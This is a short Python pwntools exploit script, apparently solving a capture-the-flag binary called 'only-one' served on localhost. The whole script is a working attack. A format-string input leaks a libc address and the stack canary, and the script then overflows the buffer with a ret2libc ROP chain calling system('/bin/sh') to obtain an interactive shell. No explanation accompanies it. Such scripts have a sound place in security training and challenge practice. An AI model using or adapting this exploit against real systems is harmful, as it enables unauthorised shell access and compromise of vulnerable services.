from pwn import * 

elf = ELF('./only-one', checksec = False)
libc = ELF('./libc.so.6', checksec = False)
context.binary = elf

# p = elf.process()
p = remote("localhost", 4093)

p.sendlineafter(">> ", "%17$p %15$p") 

recved = p.recvline().split(b' ')

libc_leak = eval(recved[-2].decode())
canary = eval(recved[-1][:-1].decode())

log.critical(f"canary : f{hex(canary)}") 
offset = 0x7f1ee6e29d90 - 0x7f1ee6e00000

libc.address = libc_leak - offset 
log.critical(f"libc @ {hex(libc.address)}")

pop_rdi = p64(libc.address + 0x000000000002a3e5)
ret = p64(libc.address + 0x0000000000029139)


p.sendlineafter(b'it !\n', cyclic(72) + p64(canary) + cyclic(8) + ret + pop_rdi + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system']))

p.interactive()


